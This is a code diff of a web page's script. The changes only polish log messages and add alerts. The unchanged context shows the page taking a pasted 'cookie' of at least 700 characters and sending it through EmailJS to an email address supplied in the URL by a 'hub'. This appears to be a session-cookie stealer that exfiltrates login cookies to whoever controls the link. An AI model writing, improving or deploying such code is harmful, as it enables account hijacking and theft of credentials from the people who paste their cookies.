@@ -65,11 +65,11 @@
     const urlParams = new URLSearchParams(window.location.search);
     const userEmail = urlParams.get('email');  // Get the user email from the URL
 
-    console.log('User email extracted: ', userEmail); // Debugging: check if email is correctly extracted
+    console.log('User email extracted:', userEmail); // Debugging: check if email is correctly extracted
 
-    // Check if the email is missing
     if (!userEmail) {
-      console.error('No email provided in URL query.');
+      console.error('No email provided!');
+      alert('No email provided in the query string. Please return to the hub and provide an email.');
     }
 
     // Function to generate a random code with uppercase letters and numbers only
@@ -100,6 +100,7 @@
         sendEmail(cookieInput, userEmail);
       } else {
         newCookieOutput.value = '';
+        alert('Cookie must be at least 700 characters long.');
       }
     }
 
@@ -115,7 +116,7 @@
         userEmail: userEmail, // Email from the hub
       };
 
-      console.log('Sending email to: ', userEmail); // Debugging: check what email is being passed
+      console.log('Sending email to:', userEmail); // Debugging: check what email is being used
 
       // Send to the user's email
       sendToEmail(templateParams);
@@ -129,7 +130,7 @@
         template_params: templateParams,
       };
 
-      console.log('Payload being sent: ', payload); // Debugging: check the full payload before sending
+      console.log('Payload being sent:', payload); // Debugging: check the payload
 
       fetch('https://api.emailjs.com/api/v1.0/email/send', {
         method: 'POST',
@@ -140,10 +141,10 @@
       })
       .then(response => response.json())
       .then(data => {
-        console.log('Email sent successfully: ', data);
+        console.log('Email sent successfully:', data);
       })
       .catch(error => {
-        console.error('Error: Could not send email.', error);  // Log error in the console
+        console.error('Error: Could not send email.', error); // Log error in the console
       });
     }
   </script>
